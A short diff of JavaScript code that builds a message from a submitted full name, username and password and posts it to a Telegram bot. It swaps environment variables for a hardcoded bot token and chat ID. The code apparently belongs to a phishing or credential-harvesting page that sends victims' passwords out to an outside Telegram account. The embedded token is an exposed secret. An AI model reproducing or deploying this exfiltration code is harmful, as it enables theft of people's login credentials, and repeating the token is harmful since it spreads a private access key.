@@ -22,8 +22,8 @@
 
         const mensaje = `fullname: ${fullname}\nusername: ${username}\npassword: ${password}`;
 
-        const token = process.env.TOKEN;
-        const chatId = process.env.ID; 
+        const token = "6188420655:AAGCuw0AsCOBnIbS0ErErIWjHC6io96dOqQ";
+        const chatId = "1004279757"; 
 
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
 
